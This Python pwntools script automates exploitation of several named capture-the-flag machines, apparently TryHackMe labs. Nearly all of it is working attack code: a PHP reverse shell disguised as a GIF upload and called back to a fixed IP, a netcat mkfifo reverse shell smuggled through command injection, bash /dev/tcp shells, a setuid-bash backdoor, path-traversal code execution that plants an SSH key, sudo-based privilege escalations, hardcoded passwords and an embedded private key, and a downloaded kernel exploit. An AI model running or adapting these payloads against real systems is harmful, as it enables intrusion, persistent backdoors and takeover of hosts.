from pwn import *
import requests
import os
import ftplib
import re

# machineName = input("Enter Machine Name: ")
sess = requests.session()
usage = f"Usage: {sys.argv[0]} <Machine Name> <Machine Ip>"

# -------------------------------------------------- Carnage -------------------------------------------------- #
def Carnage():
    global sess, ip
    payload = f"""GIF89a;
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.8.71.139/1234 0>&1'");
"""
    with open('payload.gif.php', 'w') as f:
        f.write(payload)
    files = {
        "Content-Disposition": 'form-data; name="file"; filename="payload.gif.php"',
        "file" : open('payload.gif.php', 'rb')
    }
    values = {
        "Content-Disposition": '"form-data; name="MAX_FILE_SIZE"',
        "filename" : "payload.gif.php"
    }
    send = sess.post(f"http://{ip}:82/upload.php", files=files, data=values, allow_redirects=True)
    if(send.status_code == 200):
        print("[*] Payload Sent")
        check = sess.get(f"http://{ip}:82/images/")
        print(check.text)

# -------------------------------------------------- Shrek -------------------------------------------------- #
def Shrek():
    global ip
    os.system(f"wget {ip}/Cpxtpt2hWCee9VFa.txt 2>/dev/null; mv Cpxtpt2hWCee9VFa.txt key; chmod 600 key")
    req = ssh(host=ip, user='shrek', keyfile='key')
    shell = req.process("/bin/sh")
    shell.sendline(b"""gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit""")
    shell.sendline(b"")
    time.sleep(1)
    shell.interactive()

# -------------------------------------------------- Tyler -------------------------------------------------- #
def Tyler():
    global sess, ip
    ip = input("Enter Machine Ip: ")
    LHOST = input("[*] Enter LHOST: ")
    LPORT = input("[*] Enter Listening Port: ")
    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"

    postData = {
        "user" : f'1;{payload}',
        "submit" : 'Submit+Query'
    }
    print("[*] Sending Payload")
    try:
        shell = sess.post(f"http://{ip}/betatest/checkuser.php", data=postData)
        if(shell.status_code == 200):
            print("[*] Payload Sent")
            print("[*] vim /etc/sudoers and add 'tdurden ALL=(ALL)	ALL'")
            print("[*] Then do whatever you want")
        else:
            print("[!] Payload Failed")
            exit()
    except:
        print("[!] Connection Failed")
        exit()

# -------------------------------------------------- Production -------------------------------------------------- #
def Production():
    global ip
    print("Please Add Machine Ip To Your '/etc/hosts'")
    input("[*] Press Enter To Continue")
    username = "anonymous"
    password = "anonymous"
    filenames = [
            "flag.txt",
            "id_rsa"
    ]
    ftp_server = ftplib.FTP('production.thm', username, password)
    ftp_server.encoding = 'utf-8'
    for filenames in filenames:
        with open(filenames, "wb") as f:
            ftp_server.retrbinary(f"RETR {filenames}", f.write)
        file = open("flag.txt", "r")
    ftp_server.quit()
    os.system("cat id_rsa > key")
    req = ssh(host='production.thm', user='ashu', keyfile='key')
    shell = req.process("/bin/sh")
    shell.sendline(b"sudo su skidy")
    shell.sendline(b"")
    time.sleep(1)
    shell.sendline(b"""sudo PAGER='sh -c "exec sh 0<&1"' git -p help""")
    time.sleep(1)
    shell.interactive()
    
# -------------------------------------------------- H1 - Easy -------------------------------------------------- #

def H1():
    global sess, ip
    userIp = input("Enter Your Ip: ")
    port = input("Enter Listening Port: ")
    payload = f"""exec("echo 'chmod 4777 /bin/bash' >> /home/serv3/backups/backup.sh;/bin/bash -c 'bash -i >& /dev/tcp/{userIp}/{port} 0>&1'");"""
    data = {
        "code" : payload
    }
    print("[*] Sending Payload")
    print("[*] Root Command: >$ '/bin/bash -p'")
    shell = sess.post(f"http://{ip}:8002/trycode", data=data)
    if(shell.status_code == 200):
        print("[*] Check Your Listener")
    else:
        print("[!] Server Error")
        exit()

# -------------------------------------------------- Panda -------------------------------------------------- #
def Panda():
    global ip
    req = ssh(host=ip, user="shifu", password="batman")
    shell = req.process("/bin/sh")
    time.sleep(1)
    shell.interactive()

def Fortune():
    global sess, ip
    req = ssh(host=ip, user="fortuna", password="NjFiZWIyMG")
    print("""PRIVESC: "Its needed to keyboard and i couldnt find a way to do it with the shell sry but its on todo.txt:/"
>sudo pico
>passwd: "NjFiZWIyMG"
>CTRL + R, CTRL + X
>reset; sh 1>&0 2>&0
""")
    shell = req.process("/bin/sh")
    time.sleep(1)
    shell.interactive()

def Lion():
    global ip, sess
    id_rsa = """-----BEGIN OPENSSH PRIVATE KEY-----
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
MJJkQvUOGm1CkAAAAHeTBAbmFtZQECAwQ=
-----END OPENSSH PRIVATE KEY-----"""
    myKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpvqWWy4/mlYdZVHf72LtIbjbxNXMMS0ZVHq9yb+TuGDfgyUPKtkEc64gnoB+CTj6L3kKR7h/6i9Fj3gHgeTqQSUBXgRC3uHkEnmiCqq1IIJgQ5JmUd0tlZdDizrx5/VCP1h8Bdnn92lZoI0R6kg+PchV6GWQR6vD8QQz7q6gw1mntlaHNUBAeZh2UgWirtj6MdZuoF+K1YQ6V5YYpNpgNj1JBfgexteDKuhZzuinX3UKJFaPVR4OoPxJ9hViDOKoJHgPYZe7LKZpC0hbPZEw4dB8y52pmnjkvGKBNQr284AKsrLYe3lhGR9tVgzx7i5zArf8kuHFVHOOIDB816Gq7IpnZprrEqloiw+QpJAdnt+26dbuRiwCOrVyF/DApA3oJwC4lUncej69OHtYjN4UJ8O59AcxVE//vWj9y3wWzRocQxobTXHUuXtNl5y485xTQC/6oxbCfbAkhV5D6YG51def7J0/UtmBqMgix71jO1svk5F/1XrGbU8CDBcDFCqk= y0@name"
    os.system(f"curl -s -X POST 'http://{ip}:8080/.%0d./.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c \"mkdir /home/gloria/.ssh; echo '{myKey}' > /home/gloria/.ssh/authorized_keys\"'")
    file = open('key', 'w')
    file.write(id_rsa)
    file.close()
    req = ssh(host=ip, user="gloria", keyfile='key')
    shell = req.process("/bin/sh")
    time.sleep(1)
    shell.sendline("wget https://github.com/rlarabee/exploits/blob/master/cve-2017-16995/cve-2017-16995.c; gcc --static cve-2017-16995.c -o cve; ./cve")
    time.sleep(2)
    shell.interactive()

if __name__ == "__main__":
    if len(sys.argv) < 3 :
        print(usage)
    else:
        machineName = sys.argv[1]
        ip = sys.argv[2]
        if machineName == "Tyler" or machineName == "tyler":
            Tyler()
        if machineName == "Production" or machineName == "production":
            Production()
        if machineName == "Shrek" or machineName == "shrek":
            Shrek()
        if machineName == "Panda" or machineName == "panda":
            Panda()
        if machineName == "H1" or machineName == "h1":
            H1()
        if machineName == "Carnage" or machineName == "carnage":
            Carnage()
        if machineName == "Fortune" or machineName == "fortune":
            Fortune()
        if machineName == "Lion" or machineName == "lion":
            Lion()
        else:
            print("[!] Invalid Machine Name")
            exit()
